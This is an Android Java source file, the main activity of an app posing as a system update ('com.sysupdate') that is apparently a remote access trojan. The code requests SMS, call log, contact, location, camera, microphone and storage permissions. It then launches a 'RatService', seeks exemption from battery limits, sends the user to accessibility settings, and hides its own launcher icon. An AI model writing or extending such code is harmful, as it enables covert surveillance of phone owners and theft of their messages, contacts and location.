package com.sysupdate;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ = 1001;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        requestPerms();
    }

    private void requestPerms() {
        List<String> needed = new ArrayList<>();
        String[] all = {
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CALL_PHONE
        };
        for (String p : all) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (Build.VERSION.SDK_INT >= 33) {
            if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                needed.add(Manifest.permission.POST_NOTIFICATIONS);
            }
        }

        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    needed.toArray(new String[0]), REQ);
        } else {
            afterPerms();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] res) {
        super.onRequestPermissionsResult(code, p, res);
        afterPerms();
    }

    private void afterPerms() {
        Intent svc = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(svc);
        } else {
            startService(svc);
        }

        try {
            if (Build.VERSION.SDK_INT >= 23) {
                Intent pi = new Intent();
                String pkg = getPackageName();
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(pkg)) {
                    pi.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    pi.setData(Uri.parse("package:" + pkg));
                    startActivity(pi);
                }
            }
        } catch (Exception ignored) {}

        try {
            Intent acc = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            acc.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(acc);
        } catch (Exception ignored) {}

        hideIcon();
        finishAffinity();
    }

    private void hideIcon() {
        try {
            ComponentName cn = new ComponentName(this, MainActivity.class);
            getPackageManager().setComponentEnabledSetting(
                    cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }
}